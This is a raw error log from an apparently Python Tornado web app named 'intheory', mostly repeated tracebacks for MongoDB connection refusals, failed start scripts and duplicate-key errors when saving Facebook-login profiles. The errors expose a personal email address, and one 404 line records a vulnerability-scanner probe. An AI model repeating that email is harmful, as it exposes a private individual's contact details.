couldn't exec /www/virtualenv/intheory/bin/super_start.sh: ENOEXEC
couldn't exec /www/virtualenv/intheory/bin/super_start.sh: ENOEXEC
couldn't exec /www/virtualenv/intheory/bin/super_start.sh: ENOEXEC
couldn't exec /www/virtualenv/intheory/bin/super_start.sh: ENOEXEC
couldn't exec /www/virtualenv/intheory/bin/start1.sh: ENOEXEC
couldn't exec /www/virtualenv/intheory/bin/start1.sh: ENOEXEC
couldn't exec /www/virtualenv/intheory/bin/start1.sh: ENOEXEC
couldn't exec /www/virtualenv/intheory/bin/start1.sh: ENOEXEC
python: can't open file '/www/virtualenv/intheory/src/main.py': [Errno 2] No such file or directory
python: can't open file '/www/virtualenv/intheory/src/main.py': [Errno 2] No such file or directory
python: can't open file '/www/virtualenv/intheory/src/main.py': [Errno 2] No such file or directory
python: can't open file '/www/virtualenv/intheory/src/main.py': [Errno 2] No such file or directory
Traceback (most recent call last):
Traceback (most recent call last):
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 90, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 90, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
  File "/www/virtualenv/intheory/src/app.py", line 90, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
  File "/www/virtualenv/intheory/src/app.py", line 90, in <module>
        Intheory(env, port, config_file).listen(port)
connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 90, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 90, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 90, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 90, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
Traceback (most recent call last):
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 90, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 90, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
  File "/www/virtualenv/intheory/src/app.py", line 90, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 90, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 90, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 90, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 90, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 90, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 90, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 90, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 90, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 90, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 90, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 90, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 48, in __init__
    connect(db_name, host=db_host)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 162, in connect
    return get_connection(alias)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/connection.py", line 126, in get_connection
    raise ConnectionError("Cannot connect to database %s :\n%s" % (alias, e))
mongoengine.connection.ConnectionError: Cannot connect to database default :
could not connect to localhost:27017: [Errno 111] Connection refused
WARNING:root:404 GET /search/tsc.php?&ses=1287303823ecd51041af5521978bbe262469027b42&200=Nzk0NjYyNTM=&21=NjYuMjQ5LjY2LjE3Mg==&681=MTI4NzMwMzgyM2VjZDUxMDQxYWY1NTIxOTc4YmJlMjYyNDY5MDI3YjQy&682=&616=&crc=4eb3cd5ae93eccacd1fe68038af966a308fc576f&cv=1 (127.0.0.1) 1.31ms
WARNING:root:404 GET /googlec3de338f5aca9a9e.html (127.0.0.1) 0.88ms
WARNING:root:404 GET /w00tw00t.at.ISC.SANS.DFind:) (62.141.38.144) 0.82ms
WARNING:root:405 HEAD / (127.0.0.1) 0.66ms
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['username', 'first_name', 'last_name', 'locale', 'gender', 'fb_id', 'email'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['username', 'first_name', 'last_name', 'locale', 'gender', 'fb_id', 'email'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
